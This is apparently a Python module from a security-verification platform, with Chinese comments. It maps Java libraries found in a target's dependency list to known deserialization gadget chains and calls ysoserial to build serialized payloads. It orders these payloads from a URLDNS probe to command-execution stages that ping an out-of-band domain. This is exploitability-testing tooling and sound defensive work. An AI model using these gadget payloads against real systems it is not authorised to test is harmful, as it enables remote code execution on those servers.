"""反序列化 gadget 目录与 payload 生成（第四层，2026-09-28 落地）。

第三层解决的是「证明反序列化发生了且触发了命令执行 sink」，但那只是**链路确证**——
它能证「攻击者可控字节流 → 反序列化 → 命令执行」，却不能证明 payload 真的被执行出
效果（例如靶场 classpath 上根本没有可用 gadget，链只是静态推断）。

第四层补的是**可利用性确证**：
1. classpath 感知：从 SCA 组件清单（``sca_vulnerabilities`` / SBOM）识别靶场依赖里
   实际存在哪些 gadget 库（commons-collections / commons-beanutils / rome / xstream /
   C3P0 / fastjson / Jackson 等），只有库真的在，对应 gadget 才可能打成功；
2. payload 生成：命中 gadget 库时，用 ysoserial（如已配置）生成真实序列化对象，
   未配置则产出可复现的生成指令；
3. 带外确证：payload 内嵌唯一 OOB 域名（见 ``src.iast.oob_monitor``），
   靠 DNS 回调证明「payload 确实被服务端反序列化并执行」，这是唯一能跨过
   「canary 进不了二进制序列化对象」这一结构性限制的硬证据。

铁律：**不臆造可利用性**。gadget 库不在 classpath 上就明确返回不可用；
ysoserial 不可用就返回生成指令而非伪造 payload。宁可停在 chain_proven，
也不把「猜的」写成「证的」。
"""
from __future__ import annotations

import logging
import os
import shutil
import subprocess
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)

# gadget 目录：组件坐标前缀 → gadget 定义。
# ysoserial 名：与 ysoserial 的 --gadget 参数一致（CommonCollections1..7、CommonsBeanutils1、
# Rome、C3P0、URLDNS 等）。oob_capable=True 表示该 gadget 能触发 DNS 出网（URLDNS 天然可，
# 其余需命令执行型 gadget 配合 curl/ping 触发）。
GADGET_CATALOG: Dict[str, Dict[str, Any]] = {
    "commons-collections:commons-collections": {
        "name": "CommonsCollections",
        "variants": ["CommonCollections1", "CommonCollections5", "CommonCollections6", "CommonCollections7"],
        "ysoserial": "CommonsCollections6",
        "oob_capable": True,
        "notes": "CC1 需 JDK<=8u71；CC6/CC7 兼容性最好，首选 CC6。",
    },
    "org.apache.commons:commons-collections4": {
        "name": "CommonsCollections4",
        "variants": ["CommonCollections2", "CommonCollections4"],
        "ysoserial": "CommonsCollections4",
        "oob_capable": True,
        "notes": "CC2 走 PriorityQueue+TransformingComparator，需 commons-collections4。",
    },
    "commons-beanutils:commons-beanutils": {
        "name": "CommonsBeanutils",
        "variants": ["CommonsBeanutils1"],
        "ysoserial": "CommonsBeanutils1",
        "oob_capable": True,
        "notes": "CB1 无 JDK 版本限制，Shiro 场景常见。",
    },
    "com.rometools:rome": {
        "name": "Rome",
        "variants": ["Rome"],
        "ysoserial": "Rome",
        "oob_capable": True,
        "notes": "ROME 走 ToStringBean hashCode 触发。",
    },
    "com.thoughtworks.xstream:xstream": {
        "name": "XStream",
        "variants": ["XStream"],
        "ysoserial": None,
        "oob_capable": True,
        "notes": "XStream 不是 Java 原生序列化，走 XML；需专用 probe 而非 ObjectInputStream。",
    },
    "com.mchange:c3p0": {
        "name": "C3P0",
        "variants": ["C3P0"],
        "ysoserial": "C3P0",
        "oob_capable": True,
        "notes": "C3P0 走 JNDI 引用间接加载远程类，天然出网。",
    },
    "com.alibaba:fastjson": {
        "name": "Fastjson",
        "variants": ["Fastjson"],
        "ysoserial": None,
        "oob_capable": True,
        "notes": "非原生序列化；走 @type 多态 + JdbcRowSetTemplate JNDI。",
    },
    "com.fasterxml.jackson.core:jackson-databind": {
        "name": "JacksonPolymorphic",
        "variants": ["Jackson"],
        "ysoserial": None,
        "oob_capable": True,
        "notes": "非原生序列化；需 enableDefaultTyping / @JsonTypeInfo 多态配置才可利用。",
    },
}

# 万能探测 gadget：无论 classpath 有什么，URLDNS 只依赖 JDK 自带类，
# 只要服务端做了反序列化就会产生一次 DNS 查询——用于「反序列化是否发生」的最低代价确证。
URLDNS_GADGET = {
    "name": "URLDNS",
    "variants": ["URLDNS"],
    "ysoserial": "URLDNS",
    "oob_capable": True,
    "notes": "仅证明反序列化发生，不证明 RCE；作为 OOB 探针的第一发。",
}

YSOSERIAL_JAR = os.environ.get("SAST_AI_YSOSERIAL_JAR", "")


def _norm_component(name: str) -> str:
    return str(name or "").strip().lower()


def detect_gadgets(components: Optional[List[str]]) -> List[Dict[str, Any]]:
    """从靶场依赖清单里识别可用的 gadget 库。

    components：形如 ``["commons-collections:commons-collections:3.1", ...]`` 的
    组件坐标列表（SCA 的 component_name 通常已是 group:artifact 形态）。
    返回按「是否能 RCE」排序的 gadget 列表（命令执行型优先于纯探测型）。
    """
    found: List[Dict[str, Any]] = []
    comps = [_norm_component(c) for c in (components or []) if c]
    if not comps:
        return found

    for coord, meta in GADGET_CATALOG.items():
        coord_l = coord.lower()
        for c in comps:
            if c.startswith(coord_l) or coord_l.startswith(c):
                found.append({
                    "gadget": meta["name"],
                    "ysoserial": meta.get("ysoserial"),
                    "variants": list(meta.get("variants") or []),
                    "oob_capable": bool(meta.get("oob_capable")),
                    "matched_component": c,
                    "notes": meta.get("notes", ""),
                })
                break
    return found


def _java_bin() -> str:
    return os.environ.get("SAST_AI_JAVA_BIN") or shutil.which("java") or "java"


def ysoserial_available() -> bool:
    """ysoserial 是否可用（配置了 jar 且文件存在）。"""
    return bool(YSOSERIAL_JAR) and os.path.isfile(YSOSERIAL_JAR)


def build_gadget_payload(
    gadget: str,
    command: str = "",
    oob_domain: str = "",
) -> Dict[str, Any]:
    """生成一个 gadget payload（Base64 字符串）或可复现的生成指令。

    返回 dict：
    - ``available``：是否真的产出了序列化字节（False 表示只给了指令，绝不能当证据用）；
    - ``payload_b64``：Base64 序列化对象（available=True 时才有）；
    - ``command``：实际用于 ysoserial 的命令（便于手工复现）；
    - ``notes``：为什么可用/不可用。

    优先用 OOB 域名作为命令（``ping <domain>`` / ``nslookup <domain>``），因为
    「命令是否真的执行」需要一个平台侧可观测的回执；用 ``touch /tmp/x`` 这类
    无回执命令在本平台等于没有证据。
    """
    cmd = (command or "").strip()
    if not cmd and oob_domain:
        cmd = f"ping -n 1 {oob_domain}" if os.name == "nt" else f"ping -c 1 {oob_domain}"
    if not cmd:
        return {
            "available": False,
            "payload_b64": "",
            "command": "",
            "notes": "既无命令也无 OOB 域名：无法构造可观测回执的 gadget payload。",
        }

    if not ysoserial_available():
        return {
            "available": False,
            "payload_b64": "",
            "command": f"java -jar ysoserial.jar {gadget} '{cmd}' | base64 -w0",
            "notes": (
                "未配置 SAST_AI_YSOSERIAL_JAR，无法生成真实序列化对象。"
                "此处只给出可手工复现的指令，**不构成可利用性证据**。"
            ),
        }

    argv = [_java_bin(), "-jar", YSOSERIAL_JAR, gadget, cmd]
    try:
        proc = subprocess.run(argv, capture_output=True, timeout=120)
    except Exception as exc:  # 生成失败绝不臆造
        logger.warning("[gadget] ysoserial 执行失败（%s）：%s", gadget, exc)
        return {
            "available": False,
            "payload_b64": "",
            "command": " ".join(argv),
            "notes": f"ysoserial 执行失败：{exc}",
        }
    if proc.returncode != 0 or not proc.stdout:
        return {
            "available": False,
            "payload_b64": "",
            "command": " ".join(argv),
            "notes": f"ysoserial 返回码 {proc.returncode}：{proc.stderr.decode('utf-8', 'ignore')[:300]}",
        }
    import base64

    return {
        "available": True,
        "payload_b64": base64.b64encode(proc.stdout).decode("ascii"),
        "command": " ".join(argv),
        "notes": f"ysoserial {gadget} 生成成功（{len(proc.stdout)} 字节）。",
    }


def plan_deserialization_attack(
    components: Optional[List[str]],
    oob_domain: str = "",
) -> Dict[str, Any]:
    """为一次反序列化验证编排攻击计划：先探测、再 RCE。

    顺序（先便宜后贵、先安全后侵入）：
    1. URLDNS：只依赖 JDK，证明「反序列化确实发生」；
    2. classpath 上命中的命令执行型 gadget：证明「可执行任意命令」。
    """
    gadgets = detect_gadgets(components)
    steps: List[Dict[str, Any]] = []

    dns_payload = build_gadget_payload("URLDNS", oob_domain=oob_domain)
    steps.append({
        "stage": "probe",
        "gadget": "URLDNS",
        "purpose": "证明服务端确实对攻击者输入做了反序列化（不证明 RCE）",
        **dns_payload,
    })

    for g in gadgets:
        if not g.get("ysoserial"):
            continue
        p = build_gadget_payload(str(g["ysoserial"]), oob_domain=oob_domain)
        steps.append({
            "stage": "rce",
            "gadget": g["gadget"],
            "matched_component": g.get("matched_component", ""),
            "purpose": "证明可执行任意命令（需 OOB 回调或命令 sink 观测作为回执）",
            **p,
        })

    return {
        "gadgets_detected": [g["gadget"] for g in gadgets],
        "classpath_has_gadget": bool(gadgets),
        "ysoserial_available": ysoserial_available(),
        "oob_domain": oob_domain,
        "steps": steps,
        "notes": (
            "classpath 上未发现已知 gadget 库：仅能做 URLDNS 探测，"
            "不得据此声称可利用。" if not gadgets else
            f"classpath 命中 {len(gadgets)} 个 gadget 库，按 probe→rce 顺序执行。"
        ),
    }
